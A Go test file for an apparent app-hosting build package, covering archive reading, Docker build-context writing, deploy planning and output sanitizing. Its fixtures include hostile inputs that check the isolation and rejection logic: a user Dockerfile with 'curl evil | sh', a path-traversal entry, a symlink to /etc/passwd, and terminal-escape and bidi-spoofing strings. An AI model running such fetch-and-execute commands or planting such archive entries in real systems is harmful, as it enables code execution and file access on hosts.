package build

import (
	"archive/tar"
	"bytes"
	"errors"
	"io"
	"strings"
	"testing"
)

func readTar(t *testing.T, b []byte) map[string]*tar.Header {
	t.Helper()
	out := map[string]*tar.Header{}
	tr := tar.NewReader(bytes.NewReader(b))
	for {
		h, err := tr.Next()
		if errors.Is(err, io.EOF) {
			return out
		}
		if err != nil {
			t.Fatal(err)
		}
		out[h.Name] = h
	}
}

func normalized(t *testing.T, entries ...entry) []byte {
	t.Helper()
	out, err := runNormalize(t, targz(t, entries...), DefaultLimits)
	if err != nil {
		t.Fatalf("normalize: %v", err)
	}
	return out
}

func TestReadSource(t *testing.T) {
	archive := normalized(t,
		file("shipyard.toml", `runtime = "python"`),
		file("requirements.txt", "flask\n"),
		file("pyproject.toml", "[project]\n"),
		file("app.py", "print(1)"),
		file("sub/shipyard.toml", "ignored: not top-level"),
		dir("static/"),
	)
	src, cfg, err := ReadSource(bytes.NewReader(archive))
	if err != nil {
		t.Fatalf("ReadSource: %v", err)
	}
	if string(cfg) != `runtime = "python"` || string(src.Requirements) != "flask\n" || string(src.PyProject) != "[project]\n" {
		t.Fatalf("cfg=%q req=%q pyproject=%q", cfg, src.Requirements, src.PyProject)
	}
	if len(src.Paths) != 6 || !src.has("static/") && !src.has("static") {
		t.Fatalf("paths = %v", src.Paths)
	}
}

func TestReadSourceTruncatesLargeFiles(t *testing.T) {
	archive := normalized(t, file("shipyard.toml", "# "+strings.Repeat("x", 100<<10)), file("index.html", "x"))
	_, cfg, err := ReadSource(bytes.NewReader(archive))
	if err != nil {
		t.Fatal(err)
	}
	if len(cfg) != maxInspectedFileBytes+1 {
		t.Fatalf("read %d bytes, want %d", len(cfg), maxInspectedFileBytes+1)
	}
	if _, err := ParseConfig(cfg); err == nil {
		t.Fatal("oversized shipyard.toml was accepted")
	}
}

func TestWriteContextKeepsUserFilesUnderSrc(t *testing.T) {
	archive := normalized(t,
		file("Dockerfile", "FROM evil\nRUN curl evil | sh\n"),
		file(".dockerignore", "*\n"),
		file("requirements.txt", "flask\n"),
		entry{hdr: tar.Header{Name: "run.sh", Typeflag: tar.TypeReg, Mode: 0o755}, body: "#!/bin/sh\n"},
		dir("static/"),
		symlink("static/link", "../requirements.txt"),
	)
	ours := []byte("FROM ours\n")
	var buf bytes.Buffer
	if err := WriteContext(&buf, bytes.NewReader(archive), ours); err != nil {
		t.Fatalf("WriteContext: %v", err)
	}
	got := readTar(t, buf.Bytes())

	for _, name := range []string{"Dockerfile", "src/", "src/Dockerfile", "src/.dockerignore", "src/requirements.txt", "src/run.sh", "src/static/", "src/static/link"} {
		if got[name] == nil {
			t.Errorf("context is missing %q (has %v)", name, keys(got))
		}
	}
	if got[".dockerignore"] != nil {
		t.Error("user .dockerignore reached the context root")
	}
	for name := range got {
		if name != "Dockerfile" && !strings.HasPrefix(name, SourceDir+"/") {
			t.Errorf("entry %q is outside %s/", name, SourceDir)
		}
	}
	if got["src/run.sh"].Mode != 0o755 || got["src/requirements.txt"].Mode != 0o644 {
		t.Errorf("modes: run.sh=%o requirements.txt=%o", got["src/run.sh"].Mode, got["src/requirements.txt"].Mode)
	}
	if got["src/static/link"].Linkname != "../requirements.txt" {
		t.Errorf("symlink target = %q", got["src/static/link"].Linkname)
	}

	// The root Dockerfile is ours, byte for byte.
	tr := tar.NewReader(bytes.NewReader(buf.Bytes()))
	h, err := tr.Next()
	if err != nil || h.Name != "Dockerfile" {
		t.Fatalf("first entry = %v, %v; want our Dockerfile", h, err)
	}
	body, _ := io.ReadAll(tr)
	if !bytes.Equal(body, ours) {
		t.Fatalf("root Dockerfile = %q, want ours", body)
	}
}

func TestWriteContextRejectsUnnormalizedArchive(t *testing.T) {
	// A raw (not normalised) archive with a traversal entry must not be
	// re-packed, even if someone bypassed NormalizeFile.
	raw := targz(t, file("../escape", "x"))
	if err := WriteContext(io.Discard, bytes.NewReader(raw), []byte("FROM x\n")); err == nil {
		t.Fatal("WriteContext accepted a traversal entry")
	}
	esc := targz(t, file("a", "x"), symlink("l", "../../etc/passwd"))
	if err := WriteContext(io.Discard, bytes.NewReader(esc), []byte("FROM x\n")); err == nil {
		t.Fatal("WriteContext accepted an escaping symlink")
	}
}

func TestPrepare(t *testing.T) {
	src := Source{Paths: []string{"app.py", "requirements.txt"}, Requirements: []byte("flask\n")}
	plan, err := Prepare(src, nil, testAppID)
	if err != nil {
		t.Fatalf("Prepare: %v", err)
	}
	if plan.Runtime != Python || !strings.HasPrefix(plan.Start, "flask --app app run") || plan.Health != "/" || plan.IdleTimeout != DefaultIdle {
		t.Fatalf("plan = %+v", plan)
	}
	if !bytes.Contains(plan.Dockerfile, []byte("ENV SHIPYARD_APP_ID="+testAppID)) {
		t.Fatal("Dockerfile not rendered for the app")
	}

	plan, err = Prepare(src, []byte("start = \"gunicorn app:app -b 0.0.0.0:$PORT\"\nhealth = \"/healthz\""), testAppID)
	if err != nil || plan.Start != "gunicorn app:app -b 0.0.0.0:$PORT" || plan.Health != "/healthz" {
		t.Fatalf("plan with config = %+v, %v", plan, err)
	}

	userErrors := []struct {
		name   string
		src    Source
		config string
		want   error
	}{
		{"no runtime", Source{Paths: []string{"main.go"}}, "", ErrNoRuntime},
		{"ambiguous", Source{Paths: []string{"package.json", "requirements.txt"}}, "", ErrAmbiguousRuntime},
		{"no start", Source{Paths: []string{"server.py", "requirements.txt"}}, "", ErrNoStart},
	}
	for _, tt := range userErrors {
		t.Run(tt.name, func(t *testing.T) {
			if _, err := Prepare(tt.src, []byte(tt.config), testAppID); !errors.Is(err, tt.want) {
				t.Fatalf("err = %v, want %v", err, tt.want)
			}
		})
	}
	var ce *ConfigError
	if _, err := Prepare(src, []byte("bogus = 1"), testAppID); !errors.As(err, &ce) {
		t.Fatalf("bad config: err = %v, want *ConfigError", err)
	}
}

func keys(m map[string]*tar.Header) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}

func TestSanitize(t *testing.T) {
	in := "ok\tline\nx\x00y \xff\xfe \x1b]52;c;ZXZpbA==\x07 \x1b[31mred\x1b[0m \u0085nel \u009bcsi " +
		"bidi\u202egnp.exe zero\u200bwidth bom\ufeff\r\nend"
	got := Sanitize(in)
	for _, bad := range []string{"\x00", "\x1b", "\x07", "\r", "\u0085", "\u009b", "\xff", "\u202e", "\u200b", "\ufeff"} {
		if strings.Contains(got, bad) {
			t.Errorf("Sanitize kept %q: %q", bad, got)
		}
	}
	if !strings.Contains(got, "ok\tline\nxy") || !strings.HasSuffix(got, "\nend") {
		t.Errorf("Sanitize dropped normal text: %q", got)
	}
}
